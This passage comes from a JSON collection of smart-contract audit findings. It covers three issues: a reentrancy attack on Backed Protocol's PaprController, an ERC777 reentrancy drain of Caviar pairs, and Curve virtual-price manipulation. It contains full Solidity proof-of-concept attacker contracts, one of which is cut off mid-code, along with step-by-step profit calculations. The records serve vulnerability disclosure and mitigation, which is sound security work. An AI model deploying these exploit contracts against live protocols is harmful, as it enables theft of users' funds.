}\n```\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317\n - Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so `_vaultInfo[msg.sender][collateral.addr].count = 0`. Moreover, the starting price for this NFT will be `3*oraclePrice` (because the `auctionStartPriceMultiplier = 3`), so it will be almost 3 * 50k = 150k.\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341\n - BobContract calls the function `purchaseLiquidationAuctionNFT` to buy it's own NFT with id 10 which is priced at almost 150k.\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264\n - In this function, we have the followoing variables:\n   - `collateralValueCached ` = 150k * 0 = 0\n   - `isLastCollateral ` = TRUE\n   - `debtCached ` = 250k (same as before)\n   - `maxDebtCached ` = 250k\n   - `neededToSaveVault ` = 0\n   - `price ` = 150k Please note that the functions `_purchaseNFTAndUpdateVaultIfNeeded` and `_purchaseNFT` are called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract.\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72\n   - `excess ` = 150k Since it is larger than zero, the function `_handleExcess` is called.\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532\n   - `fee ` = 15k Considering 10% fee on the excess\n   - `credit` = 135k\n   - `totalOwed ` = 135k Since this is smaller than `debtCaches` 250k, the function `_reduceDebt` is called to reduce debt from 250k to 115k.\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549\n   - `remaining` = 115k\n - All the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, still 115k is remained as debt.\n - In the last part of the function `purchaseLiquidationAuctionNFT`, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored.\n```\nif (isLastCollateral && remaining != 0) {\n            /// there will be debt left with no NFTs, set it to 0\n            _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n        }\n```\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290\n - Now, the control returns back to the contract `PaprController`. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed.\n```\nif (debt > max) {\n            revert IPaprController.ExceedsMaxDebt(debt, max);\n        }\n```\nhttps://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449\n - Now that the attack is finished. BobContract repays the flash loan after selling those 10 NFTs.\n - ***Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob's profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.***\n - Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.\n - Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.\n - ***In order to take profit and steal fund, the attacker at least should add 7 NFTs as collateral and borrow the max debt. Because `numberOfNFT * oraclePrice * 50% > oraclePrice * 3`***\n\nIn the following PoC, I am showing how the attack can be applied.\nBob deploys the following contract and calls the function `attack()`. It takes flash loan from AAVE, then the callback from the AAVE will execute `executeOperation`. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol. \nThen, it borrows max debt which is almost 250k, and remove the NFT with id 1. \nIn the callback of `safeTransferFrom`, the function `onERC721Received` is called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively. \nWhen NFTs with id 9 is removed, the function `startLiquidationAuction` is called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.\n\n```\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n\ninterface ERC721 {}\n\ninterface ERC20 {}\n\nstruct Collateral {\n    ERC721 addr;\n    uint256 id;\n}\nstruct OracleInfo {\n    Message message;\n    Sig sig;\n}\nstruct Message {\n    bytes32 id;\n    bytes payload;\n    uint256 timestamp;\n    bytes signature;\n}\nstruct Sig {\n    uint8 v;\n    bytes32 r;\n    bytes32 s;\n}\nstruct Auction {\n    address nftOwner;\n    uint256 auctionAssetID;\n    ERC721 auctionAssetContract;\n    uint256 perPeriodDecayPercentWad;\n    uint256 secondsInPeriod;\n    uint256 startPrice;\n    ERC20 paymentAsset;\n}\n\nenum PriceKind {\n    SPOT,\n    TWAP,\n    LOWER,\n    UPPER\n}\n\ninterface IPaprController {\n    function addCollateral(Collateral[] calldata collateral) external;\n\n    function increaseDebt(\n        address mintTo,\n        ERC721 asset,\n        uint256 amount,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function removeCollateral(\n        address sendTo,\n        Collateral[] calldata collateralArr,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function startLiquidationAuction(\n        address account,\n        Collateral calldata collateral,\n        OracleInfo calldata oracleInfo\n    ) external returns (Auction memory auction);\n\n    function purchaseLiquidationAuctionNFT(\n        Auction calldata auction,\n        uint256 maxPrice,\n        address sendTo,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function maxDebt(uint256 totalCollateraValue)\n        external\n        view\n        returns (uint256);\n\n    function underwritePriceForCollateral(\n        ERC721 asset,\n        PriceKind priceKind,\n        OracleInfo memory oracleInfo\n    ) external returns (uint256);\n}\n\ninterface IFundingRateController {\n    function updateTarget() external returns (uint256);\n}\n\ninterface IAAVE {\n    function flashLoanSimple(\n        address receiverAddress,\n        address asset,\n        uint256 amount,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n}\n\ncontract BobContract {\n    IPaprController iPaprController;\n    IFundingRateController iFundingRateController;\n    IAAVE iAAVE;\n    ERC721 nftCollectionAddress;\n    ERC20 paprToken;\n    Collateral[] collaterals;\n    OracleInfo oracleInfo;\n    uint256 numOfCallback;\n    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    constructor(\n        address _paprControllerAddress,\n        address _fundingRateControllerAddress,\n        address _aaveAddress,\n        ERC721 _nftCollectionAddress,\n        OracleInfo memory _oracleInfo,\n        ERC20 _paprToken\n    ) {\n        iPaprController = IPaprController(_paprControllerAddress);\n        iFundingRateController = IFundingRateController(\n            _fundingRateControllerAddress\n        );\n        iAAVE = IAAVE(_aaveAddress);\n        nftCollectionAddress = _nftCollectionAddress;\n        oracleInfo = _oracleInfo;\n        paprToken = _paprToken;\n    }\n\n    function attack() public {\n        ///// STEP1: taking flash loan\n        iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, \"\", 0);\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        ///// STEP2: buying 10 NFTs\n\n        // Buy 10 NFTs that each worths almost 50k\n        // Assume the ids are from 1 to 10\n\n        ///// STEP3: adding the NFTs as collateral\n        for (uint256 i = 0; i < 10; ++i) {\n            collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));\n        }\n        iPaprController.addCollateral(collaterals);\n\n        ///// STEP4: borrowing as much as possible\n        uint256 oraclePrice = iPaprController.underwritePriceForCollateral(\n            nftCollectionAddress,\n            PriceKind.LOWER,\n            oracleInfo\n        );\n\n        uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);\n\n        iPaprController.increaseDebt(\n            address(this),\n            nftCollectionAddress,\n            maxDebt,\n            oracleInfo\n        );\n\n        ///// STEP5: removing the NFT with id 1\n        Collateral[] memory collateralArr = new Collateral[](1);\n        collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});\n        iPaprController.removeCollateral(\n            address(this),\n            collateralArr,\n            oracleInfo\n        );\n\n        ///// STEP16: selling 10 NFTs and repaying the flash loan\n\n        // Selling the 10 NFTs\n        // Repaying the flash loan\n    }\n\n    function onERC721Received(\n        address from,\n        address,\n        uint256 _id,\n        bytes calldata data\n    ) external returns (bytes4) {\n        numOfCallback++;\n        if (numOfCallback < 9) {\n            ///// STEP6 - STEP13: removing the NFTs with id 2 to 9\n            Collateral[] memory collateralArr = new Collateral[](1);\n            collateralArr[0] = Collateral({\n                addr: nftCollectionAddress,\n                id: _id + 1\n            });\n            iPaprController.removeCollateral(\n                address(this),\n                collateralArr,\n                oracleInfo\n            );\n        } else {\n            ///// STEP14: starting the auction for NFT with id 10\n            Collateral memory lastCollateral = Collateral({\n                addr: nftCollectionAddress,\n                id: _id + 1\n            });\n            iPaprController.startLiquidationAuction(\n                address(this),\n                lastCollateral,\n                oracleInfo\n            );\n\n            ///// STEP15: buying the NFT with id 10 on the auction\n            uint256 oraclePrice = iPaprController.underwritePriceForCollateral(\n                nftCollectionAddress,\n                PriceKind.LOWER,\n                oracleInfo\n            );\n            uint256 startPrice = (oraclePrice * 3 * 1e18) /\n                iFundingRateController.updateTarget();\n\n            Auction memory auction = Auction({\n                nftOwner: address(this),\n                auctionAssetID: 10,\n                auctionAssetContract: nftCollectionAddress,\n                perPeriodDecayPercentWad: 0.7e18,\n                secondsInPeriod: 1 days,\n                startPrice: startPrice,\n                paymentAsset: paprToken\n            });\n\n            iPaprController.purchaseLiquidationAuctionNFT(\n                auction,\n                startPrice,\n                address(this),\n                oracleInfo\n            );\n        }\n    }\n}\n\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\n - Adding a reentrancy guard to the involved functions can be a solution.",
      "summary": "\nThis bug report is about a reentrancy attack involving the functions `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT` in the PaprController.sol file. This attack could allow an attacker, Bob, to steal a large amount of funds. The attack starts with Bob deploying a malicious contract, BobContract, and taking a flash loan of 500K USDC. BobContract then buys 10 NFTs from a collection that are allowed to be used as collateral in the project, each costing 50k USDC. BobContract then adds the NFTs as collateral by calling the function `addCollateral`. BobContract then borrows the maximum allowed amount of PaprToken, which is equivalent to 250k USDC. It then calls the function `removeCollateral` to remove the NFT with id 1. This triggers a callback to BobContract, which calls the function again to remove the next NFT (id 2). This is repeated for 9 NFTs, and in the last callback, BobContract calls the function `startLiquidationAuction` to put the NFT with id 10 on the auction. Since 9 NFTs were removed, BobContract's health factor is not solvent anymore, as the total debt is the same as before (250k) but the maximum debt is now 25k. After calling the function `startLiquidationAuction`, the starting price for this NFT is 3 times the oracle price, so it will be almost 3 * 50k = 150k. BobContract calls the function `purchaseLiquidationAuctionNFT` to buy its own NFT with id 10. In this function, 15k is considered as a fee, so 135k will be deducted from the debt. Since the debt was 250k, still 115k is remained as debt. In the last part of the function `purchaseLiquidationAuctionNFT`, the debt of BobContract is set to zero, meaning BobContract takes profit. BobContract then repays the flash loan after selling the 10 NFTs. In summary, BobContract borrowed 250k but only repaid 150k and received all its collateral, meaning Bob had a profit of 100k. To take profit and steal funds, the attacker must add at least 7 NFTs as collateral and borrow the maximum debt. Adding a reentrancy guard to the involved functions can be a solution.",
      "report_date": {},
      "contest_prize_txt": "$60,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-12-papr-contest",
      "sponsor_name": "Backed Protocol",
      "sponsor_link": "https://twitter.com/backed_xyz",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-12-backed",
      "github_link": "https://github.com/code-423n4/2022-12-backed-findings/issues/102",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "196",
      "slug": "h-02-stealing-fund-by-applying-reentrancy-attack-on-removecollateral-startliquidationauction-and-purchaseliquidationauctionnft-code4rena-backed-protocol-papr-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Backed Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Backed Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "NFT"
          }
        }
      ]
    },
    {
      "id": "10415",
      "kind": "MARKDOWN",
      "auditfirm_id": "7",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "73",
      "title": "Reentrancy risk in depositing to the queue",
      "content": "The internal [`_deposit`](https://github.com/pods-finance/yield-contracts/blob/9389ab46e9ecdd1ea1fd7228c9d9c6821c00f057/contracts/vaults/BaseVault.sol#L407) function handles user deposits, transferring a specified amount of `stETH` from `msg.sender` to the vault. Before moving the funds, it adds the deposit to the queue, which is processed later by the [`processQueuedDeposits`](https://github.com/pods-finance/yield-contracts/blob/9389ab46e9ecdd1ea1fd7228c9d9c6821c00f057/contracts/vaults/BaseVault.sol#L371) function.\n\n\nAs the underlying token could have hooks that allow the token sender to execute code before the transfer (e.g., ERC777 standard), a malicious user could use those hooks to re-enter the `deposit` function multiple times.\n\n\nThis re-entrancy will result in an increment in the receiver balance on the queue, even though this balance will not correspond to the actual amount deposited into the vault.\n\n\nIn the current implementation, the `_deposit` function in the `BaseVault` contract is overridden by the [implementation in the `STETHVault`](https://github.com/pods-finance/yield-contracts/blob/9389ab46e9ecdd1ea1fd7228c9d9c6821c00f057/contracts/vaults/STETHVault.sol#L113-L126), which has the correct order of operation. However, the `BaseVault` is likely to be inherited by future vaults, so it is crucial to have the correct `_deposit` implementation in this contract in case it is not overridden.\n\n\nConsider reordering the calls, doing the transfer first, and then adding the receiver to the queue to prevent this reentrancy scenario. Also, consider using [OpenZeppelin’s ERC4626 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol), which already has this solution implemented.\n\n\n**Update:** *Fixed in [PR#41](https://github.com/pods-finance/yield-contracts/pull/41), with commit `2ffcb1e` being the last one added.*",
      "summary": "\nA bug report has been filed regarding the internal `_deposit` function in the `BaseVault` contract. This function is responsible for transferring a specified amount of `stETH` from the sender to the vault, and before doing this, it adds the deposit to the queue. It is possible for a malicious user to use hooks in the underlying token to re-enter the `deposit` function multiple times, resulting in an increment in the receiver balance on the queue, even though this balance will not correspond to the actual amount deposited into the vault. \n\nThe `_deposit` function in the `BaseVault` contract has been overridden by the implementation in the `STETHVault`, which has the correct order of operation. However, the `BaseVault` is likely to be inherited by future vaults, so it is important to have the correct `_deposit` implementation in this contract in case it is not overridden. It is suggested to reorder the calls, doing the transfer first, and then adding the receiver to the queue to prevent this reentrancy scenario. Additionally, OpenZeppelin’s ERC4626 implementation, which already has this solution implemented, can also be used. \n\nThe bug has been fixed in PR#41, with commit `2ffcb1e` being the last one added.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://blog.openzeppelin.com/pods-finance-ethereum-volatility-vault-audit-1/",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "reentrancy-risk-in-depositing-to-the-queue-openzeppelin-pods-finance-ethereum-volatility-vault-audit-1-markdown",
      "firm_name": "OpenZeppelin",
      "firm_logo_square": "openzeppelin_square.png",
      "protocol_name": "Pods Finance Ethereum Volatility Vault Audit #1",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "OpenZeppelin",
        "logo_square": "openzeppelin_square.png"
      },
      "protocols_protocol": {
        "name": "Pods Finance Ethereum Volatility Vault Audit #1",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Weird ERC20"
          }
        },
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC777"
          }
        }
      ]
    },
    {
      "id": "6096",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 10,
      "protocol_id": "76",
      "title": "[H-01] Reentrancy in buy function for ERC777 tokens allows buying funds with considerable discount",
      "content": "\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L95><br>\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L137><br>\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L172><br>\n<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L203>\n\nCurrent implementation of functions `add`, `remove`, `buy` and `sell` first transfer fractional tokens, and then base tokens.\n\nIf this base token is ERC777 (extension of ERC20), we can call this function without updating the base token balance, but updating the fractional token balance.\n\n### Impact\n\nAllows to drain funds of a pairs which implements an ERC-777 token.\n\n### Proof of Concept\n\n```diff\nfunction buy(uint256 outputAmount, uint256 maxInputAmount) public payable returns (uint256 inputAmount) {\n    // *** Checks *** //\n\n    // check that correct eth input was sent - if the baseToken equals address(0) then native ETH is used\n    require(baseToken == address(0) ? msg.value == maxInputAmount : msg.value == 0, \"Invalid ether input\");\n\n    // calculate required input amount using xyk invariant\n+   @audit Use current balances\n    inputAmount = buyQuote(outputAmount);\n\n    // check that the required amount of base tokens is less than the max amount\n    require(inputAmount <= maxInputAmount, \"Slippage: amount in\");\n\n    // *** Effects *** //\n+   @audit Modifies just fractional balance\n    // transfer fractional tokens to sender\n    _transferFrom(address(this), msg.sender, outputAmount);\n\n    // *** Interactions *** //\n\n    if (baseToken == address(0)) {\n        // refund surplus eth\n        uint256 refundAmount = maxInputAmount - inputAmount;\n        if (refundAmount > 0) msg.sender.safeTransferETH(refundAmount);\n    } else {\n\n        // transfer base tokens in\n+       @audit If an ERC-777 token is used, we can re call buy function with the same balance of base token, but with different fractional balance\n        ERC20(baseToken).safeTransferFrom(msg.sender, address(this), inputAmount);\n\n    }\n    emit Buy(inputAmount, outputAmount);\n}\n```\n\n```solidity\nfunction buyQuote(uint256 outputAmount) public view returns (uint256) {\n    return (outputAmount * 1000 * baseTokenReserves()) / ((fractionalTokenReserves() - outputAmount) * 997);\n}\n```\n\nThe buy quote is used to calculate the amount of fractional token that the user will receive, and it should be less/equal to **maxInputAmount** sent by parameter in order to achieve a successful execution of function buy.\n\nCurrent buy quote can be mathematically expressed as: $\\frac{outputAmount \\times 1000 \\times baseTokenReserves}{fractionalTokenReserves - outPutAmount} \\times 997$.\n\nThen, about sales\n\n```diff\nfunction sell(uint256 inputAmount, uint256 minOutputAmount) public returns (uint256 outputAmount) {\n    // *** Checks *** //\n\n    // calculate output amount using xyk invariant\n    outputAmount = sellQuote(inputAmount);\n\n    // check that the outputted amount of fractional tokens is greater than the min amount\n    require(outputAmount >= minOutputAmount, \"Slippage: amount out\");\n\n    // *** Effects *** //\n\n    // transfer fractional tokens from sender\n+   //@audit fractional balance is updated\n    _transferFrom(msg.sender, address(this), inputAmount);\n\n    // *** Interactions *** //\n\n    if (baseToken == address(0)) {\n        // transfer ether out\n        msg.sender.safeTransferETH(outputAmount);\n    } else {\n        // transfer base tokens out\n+       @audit If an ERC-777 token is used, we can re call sell function with the same balance of base token, but with different fractional balance.\n        ERC20(baseToken).safeTransfer(msg.sender, outputAmount);\n    }\n\n    emit Sell(inputAmount, outputAmount);\n}\n```\n\n```function sellQuote(uint256 inputAmount) public view returns (uint256) {\n    uint256 inputAmountWithFee = inputAmount * 997;\n    return (inputAmountWithFee * baseTokenReserves()) / ((fractionalTokenReserves() * 1000) + inputAmountWithFee);\n}\n```\n\nCurrent sellQuote function can be expressed mathematically as:\n\n$inputAmount = \\frac{inputAmount \\times 997 \\times baseTokenReserves}{fractionalTokenReserves \\times 1000 + inputAmountWithFee}$\n\nThen we can think next scenario to drain a pair which use an ERC-777 token as base token:\n\n1.  Let's suppose the pair has 1000 base tokens(BT777) and 1000 Fractional reserve tokens (FRT)\n2.  The attacker call buy function, all with next inputs:\n    *   outputAmount = 50\n    *   maxInputAmount = 80\n3.  The attacker implements a hook, that will be executed 6 times (using a counter inside a malicus contract) when a transfer is done, and call the buy function. After this 6 times the malicious contract is call again, but this times calls the sell function, doing a huge sell for the fractional reserve token obtained.\n\nA simulation of this attack can be visualized in next table\n\n| Operation      | outputAmount (FRT) | maxInputAmount (BT777) | BT777 reserve | FRT reserve | inputAmount (BT777 to pay) | inputAmount < maxInputAmount |\n| :------------- | ------------------ | ---------------------- | ------------- | ----------- | -------------------------- | ---------------------------: |\n| Attaker buy 1  | 50                 | 80                     | 1000          | 1000        | 52                         |                         TRUE |\n| Callback buy 2 | 50                 | 80                     | 1000          | 950         | 55                         |                         TRUE |\n| Callback buy 3 | 50                 | 80                     | 1000          | 900         | 59                         |                         TRUE |\n| Callback buy 4 | 50                 | 80                     | 1000          | 850         | 62                         |                         TRUE |\n| Callback buy 5 | 50                 | 80                     | 1000          | 800         | 66                         |                         TRUE |\n| Callback buy 6 | 50                 | 80                     | 1000          | 750         | 71                         |                         TRUE |\n| Callback buy 7 | 50                 | 80                     | 1000          | 700         | 77                         |                         TRUE |\n\nThe result of this operation is that the attaker/malicious contract has 350 FRT, while BT777 reserve still has 1000 and FRT reserve has 650 tokens. The success execution needs that the attacker pays 442 BT777 eventually.\n\nTo do this, the last operation of the malicious contract is calling sell function\n\n| Operation    | inputAmount(BT777) | minOutputAmount | BT777 reserve | FRT reserve | outputAmount (BT777 to receive) | outputAmount > minOutputAmount |\n| :----------- | ------------------ | --------------- | ------------- | ----------- | ------------------------------- | -----------------------------: |\n| calback Sell | 350                | 442             | 1000          | 650         | 536                             |                           TRUE |\n\nThe result is that the attacker now controls 536 BT777, the attacker use this balance to pay the debt of 442 BT77, with a profit of 94 BT77 tokens.\n\n### Recommended Mitigation steps\n\nAdd openzeppelin nonReentrant modifier to mentioned functions, or state clear in the documentation that this protocol should not be used with ERC777 tokens.\n\n**[outdoteth (Caviar) acknowledged and commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/343#issuecomment-1372238278):**\n > Technically valid, though we don't intend to support erc777 tokens.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the functions ```add```, ```remove```, ```buy``` and ```sell``` of the code-423n4/2022-12-caviar repository. These functions first transfer fractional tokens, then base tokens, and if the base token is an ERC777 token, this function can be called repeatedly without updating the base token balance, allowing the attacker to drain funds of a pair. \n\nTo illustrate this attack, an example is given where the pair has 1000 base tokens (BT777) and 1000 fractional reserve tokens (FRT). The attacker calls the buy function with the parameters outputAmount = 50 and maxInputAmount = 80, and implements a hook that will be executed 6 times when a transfer is done. After the 6 calls, the malicious contract calls the sell function with the inputAmount = 350 and minOutputAmount = 442. The result is that the attacker now controls 536 BT777, which can be used to pay the debt of 442 BT77 and make a profit of 94 BT77 tokens.\n\nTo mitigate this vulnerability, the openzeppelin nonReentrant modifier should be added to the mentioned functions, or it should be clearly stated in the documentation that this protocol should not be used with ERC777 tokens.",
      "report_date": {},
      "contest_prize_txt": "$36,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-12-caviar-contest",
      "sponsor_name": "Caviar",
      "sponsor_link": "https://twitter.com/caviarAMM",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/343",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "193",
      "slug": "h-01-reentrancy-in-buy-function-for-erc777-tokens-allows-buying-funds-with-considerable-discount-code4rena-caviar-caviar-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Caviar",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Caviar",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Indexes"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "5643",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "89",
      "title": "H-1: H-01 wstETH-ETH Curve LP Token Price can be manipulated to Cause Unexpected Liquidations",
      "content": "Source: https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/7 \n\n## Found by \nBahurum, GalloDaSballo\n\n## Summary\n\nThe wsteETH-ETH LP token is priced via it's [`virtual_price`](https://github.com/sherlock-audit/2022-12-sentiment/blob/main/oracle/src/curve/StableCurveEthOracle.sol#L72)\n\nThrough what [Chainalysis called View only Reentrancy](https://chainsecurity.com/heartbreaks-curve-lp-oracles/), we can reduce the value of `virtual_price`, causing the RiskEngine to trigger a liquidation event.\n\n## Vulnerability Detail\n\nPer some testing I made, we know that the Debt for such an account will be denominated in WETH, this price cannot be tampered.\n\nHowever, the price of the ETH-wstETH LP Token can be manipulated by calling the RiskEngine while reEntering from the `POOL.remove_liquidity` function.\n\nThis is possible because the function will send ETH first, before updating it's internal wstETH balances.\n\nTo test the maximum impact I simulated borrowing an infinite amount of WETH (by impersonating the GMX Vault).\n\nIf that amount of ETH were available on Arbitrum, we can achieve over 10x in price suppression, effectively making any \"normal\" account instantly liquidatable.\n\nThe estimated cost of the attack is 60 BPS of the total ETH used (due to price impact)\n\n## Impact\n\nBecause of the price manipulation, we can trigger unfair liquidations to our advantage, because the cost of manipulation is in the 50BPS range, any time a big enough deposit is made, it becomes profitable to force liquidate them.\n\nIn the theoretical scenario shown below (borrowing from GMX Vault), I can effectively liquidate any account using the token.\nA more pragmatic scenario is listed below as well\n\n## Code Snippet\n\nBelow a simulation showing how to achieve the Virtual Price Manipulation, the last piece of the attack would be to call liquidate on an account while re-entering\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.10;\n\n\nimport {IERC20} from \"@oz/token/ERC20/IERC20.sol\";\nimport {SafeERC20} from \"@oz/token/ERC20/utils/SafeERC20.sol\";\nimport {ReentrancyGuard} from \"@oz/security/ReentrancyGuard.sol\";\n\ninterface IAccount {\n  function getAssets() external view returns (address[] memory);\n  function getBorrows() external view returns (address[] memory);\n}\ninterface IRiskEngine {\n  function getBalance(address account) external view returns (uint);\n  function getBorrows(address account) external view returns (uint);\n}\n\ninterface ISentimentCore {\n  function riskEngine() external view returns (address);\n}\n\ninterface ICurvePool {\n  function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);\n  function remove_liquidity(uint256 amount, uint256[2] memory min_amounts) external returns (uint256);\n  function get_virtual_price() external view returns (uint256);\n}\n\ninterface ILP {\n  function balanceOf(address) external view returns (uint256);\n}\n\ncontract VirtualPriceManip {\n  ICurvePool POOL = ICurvePool(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);\n  ILP LP = ILP(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);\n  ILP WSTETH = ILP(0x5979D7b546E38E414F7E9822514be443A4800529);\n  // Get WETH\n\n  // Check Virtual Price\n\n  // Deposit into Curve\n\n  // Check Virtual Price\n\n  // Withdraw, and ReEnter\n\n  // Check Virtual Price\n\n  // End, Check Virtual Price\n\n  event Debug(string name, uint256 value);\n\n  function fakeSentimentPrice() internal returns (uint256){\n    uint256 FAKE_WETH_PRICE = 1e18;\n    return FAKE_WETH_PRICE * POOL.get_virtual_price() / 1e18;\n  }\n\n  function startAttack() external payable {\n    uint256 amt = msg.value;\n\n    // 1. Check Virtual Price\n    emit Debug(\"Virtual Price 1\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 1\", fakeSentimentPrice());\n\n    // 2. Curve deposit\n    uint256[2] memory dep = [amt, 0];\n    POOL.add_liquidity{value: amt}(dep, 1);\n\n    // 3. Check Virtual Price\n    emit Debug(\"Virtual Price 